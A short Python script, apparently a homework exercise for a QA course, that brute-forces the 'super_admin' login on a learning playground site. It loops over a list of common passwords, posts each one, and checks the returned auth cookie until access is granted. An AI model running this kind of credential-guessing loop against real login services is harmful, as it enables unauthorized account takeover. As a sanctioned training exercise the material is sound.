import requests

passwords = ['password', '123456', '12345678', 'qwerty', 'abc123', 'monkey',
    'letmein', 'trustno1', 'dragon', 'baseball', '111111', 'iloveyou',
    'master', 'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow',
    '123123', '654321', 'superman', 'qazwsx', 'michael', 'Football',
    'password1', '000000', 'princess', 'batman', 'passw0rd', 'zaq1zaq1',
    'freedom', 'whatever', 'charlie', 'hottie', 'loveme', 'hello',
    'donald', 'aa123456', '12345', '1234', 'football', 'mustang',
    'jesus', 'ninja', 'azerty', 'solo', 'flower', 'welcome', 'login',
    'admin', 'starwars', 'master', '1234567', '123456789', '1234567890',
    '1qaz2wsx', 'access', 'mike', 'qwertyuiop', '121212', 'qwerty123',
    '1q2w3e4r', 'qwertyuiop', '654321', '555555', 'lovely', '7777777',
    '888888', '123qwe']

login = "super_admin"

for password in passwords:
    payload = {"login": login, "password": password}

    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = payload)

    cookie_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})

        response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)

        if response2.text == "You are authorized":
            print(response2.text, f'Correct password = "{password}"', sep = '\n')
            break

        else:
            continue
